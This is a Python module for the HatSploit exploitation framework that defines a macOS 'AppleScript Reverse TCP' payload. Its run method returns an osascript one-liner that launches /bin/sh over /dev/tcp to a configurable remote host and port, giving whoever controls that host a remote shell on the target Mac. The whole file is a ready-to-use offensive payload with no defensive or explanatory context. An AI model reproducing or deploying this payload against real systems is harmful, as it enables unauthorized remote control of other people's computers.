"""
This payload requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

from hatsploit.lib.core.payload.basic import *


class HatSploitPayload(Payload, Handler):
    def __init__(self):
        super().__init__({
            'Name': "AppleScript Reverse TCP",
            'Payload': "macos/generic/applescript_reverse_tcp",
            'Authors': [
                'Ivan Nikolskiy (enty8080) - payload developer',
            ],
            'Description': "AppleScript reverse TCP payload.",
            'Arch': ARCH_APPLESCRIPT,
            'Platform': OS_MACOS,
            'Type': REVERSE_TCP,
        })

    def run(self):
        payload = f"osascript -e 'do shell script \"/bin/sh &>/dev/tcp/{self.rhost.value}/{self.rport.value} 0>&1 &\"'"
        return payload
